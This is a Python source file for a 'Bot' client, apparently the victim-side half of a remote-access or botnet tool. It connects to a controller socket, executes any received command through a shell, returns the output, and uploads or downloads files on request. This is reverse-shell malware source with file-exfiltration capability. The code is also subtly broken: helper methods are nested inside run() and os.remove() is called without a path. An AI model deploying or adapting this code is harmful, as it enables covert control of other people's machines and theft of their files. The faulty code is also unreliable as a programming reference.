import threading
import os, sys, subprocess
import socket

class Bot(threading.Thread):

    def __init__(self, IP= "127.0.0.1", port= 5000):
        self.con = socket.socket()
        self.con.connect((IP, port))
        print("Connected")
        self.IP = IP

        self.results = ''

        super(Bot, self).__init__()

    def run(self):
        try:
            message = ""
            while message != 'wq':
                message = self.recvData()

                if message == "wq":
                    continue

                elif message[:3] == "-DF":
                    fileName = message[4:]
                    self.sendFile(fileName)

                elif message[:3] == "-UF":
                    fileName = message[4:]
                    self.recvFile(fileName)

                elif message[:2] == "cd":
                    directory = message[3:]
                    try:
                        os.chdir(directory)
                        self.results = str(os.getcwd())
                    except:
                        self.results = "Error in changing directory, check if it exist"

                else:
                    cmd = subprocess.Popen(message, shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE)
                    self.results = (cmd.stdout.read() + cmd.stderr.read()).decode('utf-8')

                self.sendData(self.results)
                print(self.results)

        except:
            self.con.close()
            print(str(sys.exc_info()[0]))
            print("Error, closing connection")

        def recvData(self):
            message = self.con.recv(1024)
            return message.decode('utf-8')

        def recvByteData(self):
            message = self.con.recv(1024)
            return message

        def recvFile(self, fileName):
            with open(fileName, 'wb') as file:
                data = "".encode('utf-8')
                error = False

                while True:
                    chunk = self.con.recv(1024)

                    if sys.getsizeof(chunk) < 1024:

                        if "$$ERROR$$" in chunk.decode('utf-8'):
                            self.results = "ERROR ENCOUNTERED, check that the given file exist"
                            file.close()
                            os.remove()
                            error = True
                            break

                        else:
                            data += chunk
                            break
                    else:
                        data += chunk

                if not error:
                    self.results = "FILE UPLOADED"
                    file.write(data)

        def sendData(self, data):
            try:
                data = data.encode('utf-8')
                dataSize = str(sys.getsizeof(data))
                while sys.getsizeof(dataSize) < 1032:
                    dataSize = '0' + dataSize

                self.con.send(dataSize.encode('utf-8'))
                self.con.send(data)
                return True

            except:
                print('Error,' + str(sys.exc_info()[0]))
                return False

        def sendFile(self, fileName):
            try:
                with open(fileName, 'rb') as file:
                    while True:
                        chunk = file.read(1024)

                        if sys.getsizeof(chunk) < 1024:
                            self.con.send(chunk)
                            self.con.recv(19)
                            break
                        else:
                            self.con.send(chunk)

                    self.results = "FILE DOWNLOADED"
                return

            except:
                self.con.send("$$ERROR$$".encode('utf-8'))
                self.con.recv(19)
                self.results = "ERROR ENCOUNTERED, check that the file exist"
                
if __name__ == "__main__":
    bot = Bot()
    bot.start()
